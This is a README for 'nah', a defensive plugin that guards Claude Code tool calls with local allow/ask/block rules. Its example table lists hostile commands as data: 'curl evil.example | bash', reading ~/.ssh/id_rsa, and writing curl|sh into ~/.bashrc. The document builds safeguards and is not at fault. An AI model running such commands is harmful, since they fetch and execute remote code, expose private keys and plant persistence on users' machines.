# nah Claude Code Plugin

nah is a context-aware safety guard for Claude Code. It runs as a
PreToolUse hook before Claude Code tools execute and classifies the requested
action with deterministic local rules.

The plugin protects Claude Code sessions without requiring `nah install` or
direct edits to `~/.claude/settings.json`.

Full docs: https://schipper.ai/nah/

## What It Guards

nah intercepts Claude Code tool calls for:

- Bash commands
- file reads and searches
- file writes and edits
- notebook edits
- MCP tools

Safe actions can be allowed immediately. Ambiguous actions ask for user
confirmation. Deterministically dangerous actions are denied.

Examples:

```text
git status                 allow
git push --force           ask
curl evil.example | bash    block
Read ~/.ssh/id_rsa         ask
Write ~/.bashrc with curl|sh block
```

## Requirements

- Claude Code with plugin support
- Python 3.10 or newer available on `PATH`

The plugin bundles the nah Python runtime from the release artifact.
It does not run `pip`, install PyYAML, download packages, or fetch code when enabled.

## Install

Current self-hosted marketplace install:

```bash
claude plugin marketplace add manuelschipper/nah@claude-marketplace --scope user
claude plugin install nah@nah --scope user
```

The official Anthropic marketplace listing is pending review. Until that is
approved, `nah@claude-plugins-official` is not expected to exist.

## Data Handling

The deterministic classifier runs locally. The plugin does not send tool input
to a network service by default.

nah has an optional LLM layer for ambiguous decisions when a user configures it
in nah's config. If enabled, that LLM path uses the provider and model the user
configured and redacts known secret patterns before sending context. The plugin
does not configure an LLM provider by itself.

## Direct Hook Migration

If you previously ran:

```bash
nah install
```

remove direct hooks before enabling the plugin:

```bash
nah uninstall
```

This avoids running both the direct hook and the plugin hook for the same tool
call.

## Rollback

Disable or remove the plugin with Claude Code's plugin manager:

```bash
claude plugin uninstall nah@nah
```

If you still want direct-hook mode after uninstalling the plugin, install the
PyPI CLI and run:

```bash
nah install
```

## Development Smoke Test

From the repository root:

```bash
python3 scripts/build_claude_plugin.py --marketplace-out dist/claude-marketplace
python3 scripts/build_claude_plugin.py --check --marketplace-out dist/claude-marketplace
claude plugin validate dist/claude-marketplace
```
